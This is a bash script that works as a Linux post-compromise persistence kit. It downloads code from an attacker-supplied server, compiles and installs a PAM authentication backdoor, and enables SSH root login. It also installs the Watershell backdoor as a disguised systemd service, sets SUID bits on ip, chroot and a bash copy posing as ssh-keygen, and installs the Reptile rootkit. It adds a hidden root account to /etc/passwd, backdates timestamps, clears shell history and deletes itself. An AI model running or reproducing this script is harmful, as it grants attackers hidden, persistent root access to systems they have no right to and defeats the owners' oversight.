#!/bin/bash

set +e
set +o history

CWD=$(pwd)

# Validate input
if [ $# -ne 1 ]; then
    echo "Usage: $0 <server_ip:port>"
    exit 1
fi
SERV_IP_PORT="$1"

# Check for wget or curl
FETCH_CMD="wget"
if ! command -v wget &>/dev/null; then
    FETCH_CMD="curl -O"
fi

SYSTEM=""

# Determine package manager
PKG_MANAGER=""
if command -v apt &>/dev/null; then
    PKG_MANAGER="apt install -y"
    SYSTEM="debian"
    apt update -y
    $PKG_MANAGER libpam0g-dev gcc make build-essential
elif command -v dnf &>/dev/null; then
    PKG_MANAGER="dnf install -y"
    SYSTEM="rhel"
    # dnf update -y
    $PKG_MANAGER pam-devel gcc
elif command -v yum &>/dev/null; then
    PKG_MANAGER="yum install -y"
    SYSTEM="rhel"
    # yum update -y
    $PKG_MANAGER pam-devel gcc
else
    exit 1
fi

# Create directories
mkdir -p /var/opt/bds /opt/bds
cd /var/opt/bds

# Backdoor PAM
$FETCH_CMD $SERV_IP_PORT/pam_backdoor.c

gcc -fPIC -shared -o pam_bds.so pam_backdoor.c

# Modify PAM configuration
if [ "$SYSTEM" = "debian" ]; then
    PAM_SO_FILE=""
    PAM_VAR="pam_bds.so"
    # Find module location
    if [ -d /lib/x86_64-linux-gnu/security ]; then
        PAM_SO_FILE="/lib/x86_64-linux-gnu/security/pam_bds.so"
    elif [ -d /lib/security ]; then
        PAM_SO_FILE="/lib/security/pam_bds.so"
    elif [ -d /lib/i386-linux-gnu/security ]; then
        PAM_SO_FILE="/lib/i386-linux-gnu/security/pam_bds.so"
    elif [ -d /usr/lib64/security ]; then
        PAM_SO_FILE="/usr/lib64/security/pam_bds.so"
    elif [ -d /usr/lib/security ]; then
        PAM_SO_FILE="/usr/lib/security/pam_bds.so"
    else
        PAM_SO_FILE="/etc/pam.d/pam_bds.so"
        PAM_VAR="/etc/pam.d/pam_bds.so"
    fi
    mv pam_bds.so "$PAM_SO_FILE"
    if ! grep -qF "pam_bds.so" "/etc/pam.d/common-auth"; then
        awk -v newline="auth    sufficient                      $PAM_VAR" '
            NF > 0 && $1 !~ /^#/ && !done {
                print newline;
                $0 = $0 " use_first_pass";
                done = 1;
            }
            { print }
        ' "/etc/pam.d/common-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/common-auth"
    fi
    touch -d "Jun 26 2022" "/etc/pam.d/common-auth"
else
    PAM_SO_FILE=""
    PAM_VAR="pam_bds.so"
    # Find module location
    if [ -d /lib64/security ]; then
        PAM_SO_FILE="/lib64/security/pam_bds.so"
    elif [ -d /lib/security ]; then
        PAM_SO_FILE="/lib/security/pam_bds.so"
    elif [ -d /usr/lib64/security ]; then
        PAM_SO_FILE="/usr/lib64/security/pam_bds.so"
    elif [ -d /usr/lib/security ]; then
        PAM_SO_FILE="/usr/lib/security/pam_bds.so"
    else
        PAM_SO_FILE="/etc/security/pam_bds.so"
        PAM_VAR="/etc/pam.d/pam_bds.so"
    fi
    mv pam_bds.so "$PAM_SO_FILE"
    if ! grep -qF "pam_bds.so" "/etc/pam.d/system-auth"; then
        awk -v newline="auth    sufficient                      $PAM_VAR" '
            NF > 0 && $1 !~ /^#/ && !done {
                print newline;
                $0 = $0 " use_first_pass";
                done = 1;
            }
            { print }
        ' "/etc/pam.d/system-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/system-auth"
    fi
    if ! grep -qF "pam_bds.so" "/etc/pam.d/password-auth"; then
        awk -v newline="auth    sufficient                      $PAM_VAR" '
            NF > 0 && $1 !~ /^#/ && !done {
                print newline;
                $0 = $0 " use_first_pass";
                done = 1;
            }
            { print }
        ' "/etc/pam.d/password-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/password-auth"
    fi  
    touch -d "Jun 26 2022" "/etc/pam.d/system-auth"
    touch -d "Jun 26 2022" "/etc/pam.d/password-auth"
fi  


# Enable root login
if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
    sed -i '/PermitRootLogin/c\PermitRootLogin yes' /etc/ssh/sshd_config
else
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
fi
systemctl restart sshd 2>/dev/null
systemctl restart ssh 2>/dev/null


# Install Watershell
$FETCH_CMD "$SERV_IP_PORT/watershell.tar.gz"
tar -xvf watershell.tar.gz
rm watershell.tar.gz
cd watershell
gcc -o bds_sys watershell.c || mv bds_sys /opt/bds/
mv bds_sys /opt/bds/
/opt/bds/bds_sys &
cat > /etc/systemd/system/bds_sys.service <<EOF
[Unit]
Description=BDS System Service
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/opt/bds/bds_sys
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
cd /var/opt/bds
systemctl enable bds_sys.service
systemctl start bds_sys.service


# Determine kernel version
KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)

# Create startup for reptile
if [ "$KERNEL_MAJOR" -le 4 ]; then
    cat > /etc/systemd/system/bds_stat.service <<EOF
[Unit]
Description=BDS Status Service
After=network.target

[Service]
Type=oneshot
ExecStart=/lib/udev/bds
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable bds_stat.service
    systemctl start bds_stat.service
fi

# Set SUID bits
chmod u+s $(which ip) $(which chroot)
cp $(which bash) /usr/lib/openssh/ssh-keygen
chmod u+s /usr/lib/openssh/ssh-keygen

# Install net-tools
$PKG_MANAGER net-tools

# Install rootkit
if [ "$KERNEL_MAJOR" -le 4 ]; then
    $FETCH_CMD $SERV_IP_PORT/reptile.tar.gz
    tar -xvf reptile.tar.gz
    rm reptile.tar.gz
    cd reptile
    $PKG_MANAGER gcc make build-essential
    make defconfig
    make
    make install
    rm -rf ../reptile*
    cd /var/opt/bds
    echo '#<reptile>' >> /etc/passwd
    echo 'tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
    echo '#</reptile>' >> /etc/passwd
else
    sysctl kernel.ftrace_enabled=1
    $FETCH_CMD $SERV_IP_PORT/bds.tar.gz
    tar -xvf bds.tar.gz
    rm bds.tar.gz
    cd bds
    ./install.sh
    cd /var/opt/bds
fi

# Change file dates
touch -d "Aug 2 2018" "/etc/passwd"
touch -d "May 10 2019" "/etc/ssh/sshd_config"
touch -d "Jun 14 2018" "/etc/pam.d"
touch -d "Aug 2 2018" "/opt"
touch -d "Aug 2 2018" "/var/opt"
touch -d "Dec 11 2019" "/usr/lib/openssh/ssh-keygen"
touch -d "Dec 21 2019" "$(which ip)"
touch -d "Dec 29 2019" "$(which chroot)"

# Clear history
history -c
rm -f $HISTFILE

# Delete script
cd "$CWD"
rm -f "$0"